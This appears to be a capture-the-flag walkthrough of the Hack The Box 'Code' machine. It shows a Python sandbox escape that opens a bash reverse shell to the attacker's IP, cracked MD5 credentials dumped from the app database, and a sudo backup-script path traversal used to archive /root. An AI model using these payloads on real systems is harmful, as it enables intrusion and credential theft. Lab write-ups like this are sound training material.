---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - SSTI
---
# Overview

| Name        | Code      |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [30] |
| Status      | Done      |

---
# Recon
## Nmap

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Site is in `code.htb:5000`
# Exploitation SSTI

```python
print("Hello, world!")
().__class__.__base__.__subclasses__()[317](["/bin/bash","-c","ls|bash -i >& /dev/tcp/10.10.14.111/9001 0>&1"])
```

## Why it works?

- `().__class__.__base__.__subclasses__()`:
    
    - `()` creates an empty tuple.
        
    - `.__class__` gets the class of the tuple, which is `tuple`.
        
    - `.__base__` gets the base class of `tuple`, which is `object`.
        
    - `.__subclasses__()` returns a list of all classes that inherit from `object`.
        
- `[317]`: This accesses the 318th element (index 317) in the list of subclasses. The specific class at this index depends on the Python environment and version.
    
- `(["/bin/bash","-c","ls|bash -i >& /dev/tcp/10.10.14.111/9001 0>&1"])`: This is a list of arguments passed to the class at index 317. The arguments are:
    
    - `"/bin/bash"`: Specifies the Bash shell.
        
    - `"-c"`: Tells Bash to execute the following command string.
        
    - `"ls|bash -i >& /dev/tcp/10.10.14.111/9001 0>&1"`: This is a Bash command that:
        
        - `ls`: Lists the contents of the current directory.
            
        - `|`: Pipes the output to the next command.
            
        - `bash -i`: Starts an interactive Bash shell.
            
        - `>& /dev/tcp/10.10.14.111/9001`: Redirects the shell's input and output to a TCP connection to the IP address `10.10.14.111` on port `9001`.
            
        - `0>&1`: Redirects file descriptor 0 (stdin) to file descriptor 1 (stdout), effectively creating a reverse shell.

- Then get reverse `shell`  by receiving with netcat.

```bash
app-production@code:~/app$ cat app.py 
cat app.py
from flask import Flask, render_template,render_template_string, request, jsonify, redirect, url_for, session, flash
from flask_sqlalchemy import SQLAlchemy
import sys
import io
import os
import hashlib
app = Flask(__name__)
app.config['SECRET_KEY'] = "7j4D5htxLHUiffsjLXB1z9GaZ5"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)
    codes = db.relationship('Code', backref='user', lazy=True)
class Code(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)
    name = db.Column(db.String(100), nullable=False)
    def __init__(self, user_id, code, name):
        self.user_id = user_id
        self.code = code
        self.name = name
@app.route('/')
def index():
    code_id = request.args.get('code_id')
    return render_template('index.html', code_id=code_id)
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        existing_user = User.query.filter_by(username=username).first()
        if existing_user:
            flash('User already exists. Please choose a different username.')
        else:
            new_user = User(username=username, password=password)
            db.session.add(new_user)
            db.session.commit()
            flash('Registration successful! You can now log in.')
            return redirect(url_for('login'))
    
    return render_template('register.html')
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        user = User.query.filter_by(username=username, password=password).first()
        if user:
            session['user_id'] = user.id
            flash('Login successful!')
            return redirect(url_for('index'))
        else:
            flash('Invalid credentials. Please try again.')
    return render_template('login.html')
@app.route('/logout')
def logout():
    session.pop('user_id', None)
    flash('You have been logged out.')
    return redirect(url_for('index'))
@app.route('/run_code', methods=['POST'])
def  run_code():
    code = request.form['code']
    old_stdout = sys.stdout
    redirected_output = sys.stdout = io.StringIO()
    try:
        for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'subprocess', '__import__', '__builtins__']:
            if keyword in code.lower():
                return jsonify({'output': 'Use of restricted keywords is not allowed.'})
        exec(code)
        output = redirected_output.getvalue()
    except Exception as e:
        output = str(e)
    finally:
        sys.stdout = old_stdout
    return jsonify({'output': output})
@app.route('/load_code/<int:code_id>')
def load_code(code_id):
    if 'user_id' not in session:
        flash('You must be logged in to view your codes.')
        return redirect(url_for('login'))
    code = Code.query.get_or_404(code_id)
    if code.user_id != session['user_id']:
        flash('You do not have permission to view this code.')
        return redirect(url_for('codes'))
    return jsonify({'code': code.code})
@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' not in session:
        return jsonify({'message': 'You must be logged in to save code.'}), 401
    user_id = session['user_id']
    code = request.form.get('code')
    name = request.form.get('name')
    if not code or not name:
        return jsonify({'message': 'Code and name are required.'}), 400
    new_code = Code(user_id=user_id, code=code, name=name)
    db.session.add(new_code)
    db.session.commit()
    return jsonify({'message': 'Code saved successfully!'})
@app.route('/codes', methods=['GET', 'POST'])
def codes():
    if 'user_id' not in session:
        flash('You must be logged in to view your codes.')
        return redirect(url_for('login'))
    user_id = session['user_id']
    codes = Code.query.filter_by(user_id=user_id).all()
    if request.method == 'POST':
        code_id = request.form.get('code_id')
        code = Code.query.get(code_id)
        if code and code.user_id == user_id:
            db.session.delete(code)
            db.session.commit()
            flash('Code deleted successfully!')
        else:
            flash('Code not found or you do not have permission to delete it.')
        return redirect(url_for('codes'))     
    return render_template('codes.html',codes=codes)
@app.route('/about')
def about():
    return render_template('about.html')
if __name__ == '__main__':
    if not os.path.exists('database.db'):
        with app.app_context():
            db.create_all()
    app.run(host='0.0.0.0', port=5000)
```

- We can see it uses `Md5` hash.

```bash
cat database.db
�O"�O�P�tablecodecodeCREATE TABLE code (
	id INTEGER NOT NULL, 
	user_id INTEGER NOT NULL, 
	code TEXT NOT NULL, 
	name VARCHAR(100) NOT NULL, 
	PRIMARY KEY (id), 
	FOREIGN KEY(user_id) REFERENCES user (id)
)�*�7tableuseruserCREATE TABLE user (
	id INTEGER NOT NULL, 
	username VARCHAR(80) NOT NULL, 
	password VARCHAR(80) NOT NULL, 
	PRIMARY KEY (id), 
	UNIQUE (username)
x��xQR)Mmolly5f4dcc3b5aa765d61d8327deb882cf99*Mmartin3de6f30c4a09c27fc71932bfc68474be/#Mdevelopment759b74ce43947f5f4c91aeddc3e5bad3
�����	molly
���&$n#	Cprint("Functionality test")Testapp-production@code:~/app/instance$ ls
ls
database.db
```

- Just go to `crackstation` and put hashes for each

```
username: molly
password: password
username: martin
password: nafeelswordsmaster
username: development
password: development
```

- We only need of martin right now since its only user in machine but first lets grab `user.txt`.
## User Flag

```bash
app-production@code:~/app$ cd /home
cd /home
app-production@code:/home$ ls
ls
app-production
martin
app-production@code:/home$ cd martin
cd martin
bash: cd: martin: Permission denied
app-production@code:/home$ cd app-production
cd app-production
app-production@code:~$ ls
ls
app
user.txt
app-production@code:~$ cat user.txt
cat user.txt
# User flag motherfucker
app-production@code:~$ 
```

# Privilege Escalation

- I connected remotely using `ssh` to `martin`  by command `ssh martin@10.10.11.62` and password `nafeelswordsmaster`.

```bash
martin@code:~$ cd backups
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  task.json    
```

```bash
martin@code:~/backups$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
martin@code:~/backups$ cat /usr/bin/backy.sh
#!/bin/bash
if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi
json_file="$1"
if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi
allowed_paths=("/var/" "/home/")
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
/usr/bin/echo "$updated_json" > "$json_file"
directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')
is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}
for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done
/usr/bin/backy "$json_file"
martin@code:~/backups$ 
```

- We can see the script archive folders from directories to archive and put it in destination.

- We can modify `task.json` file by traversal bypass to archive the `root` folder.

```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/var/....//root/"
  ]
}
```

- Now run it by `sudo /usr/bin/backy.sh /home/martin/backups/task.json` .
## Root

```bash
martin@code:~/backups$ sudo /usr/bin/backy.sh /home/martin/backups/task.json
2025/03/23 13:03:27 🍀 backy 1.2
2025/03/23 13:03:27 📋 Working with /home/martin/backups/task.json ...
2025/03/23 13:03:27 💤 Nothing to sync
2025/03/23 13:03:27 📤 Archiving: [/var/../root]
2025/03/23 13:03:27 📥 To: /home/martin/backups ...
2025/03/23 13:03:27 📦
tar: Removing leading `/var/../' from member names
/var/../root/
/var/../root/.local/
/var/../root/.local/share/
/var/../root/.local/share/nano/
/var/../root/.local/share/nano/search_history
/var/../root/.sqlite_history
/var/../root/.profile
/var/../root/scripts/
/var/../root/scripts/cleanup.sh
/var/../root/scripts/backups/
/var/../root/scripts/backups/task.json
/var/../root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
/var/../root/scripts/database.db
/var/../root/scripts/cleanup2.sh
/var/../root/.python_history
/var/../root/root.txt
/var/../root/.cache/
/var/../root/.cache/motd.legal-displayed
/var/../root/.ssh/
/var/../root/.ssh/id_rsa
/var/../root/.ssh/authorized_keys
/var/../root/.bash_history
/var/../root/.bashrc
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  task.json
martin@code:~/backups$ 
martin@code:~/backups$ tar -xvjf code_var_.._root_2025_March.tar.bz2
root/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.local/share/nano/search_history
root/.sqlite_history
root/.profile
root/scripts/
root/scripts/cleanup.sh
root/scripts/backups/
root/scripts/backups/task.json
root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
root/scripts/database.db
root/scripts/cleanup2.sh
root/.python_history
root/root.txt
root/.cache/
root/.cache/motd.legal-displayed
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.bash_history
root/.bashrc
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  code_var_.._root_2025_March.tar.bz2  root  task.json
martin@code:~/backups$ cd root
martin@code:~/backups/root$ ls
root.txt  scripts
martin@code:~/backups/root$ cat root.txt
#Root flag motherfucker
martin@code:~/backups/root$ 
```

---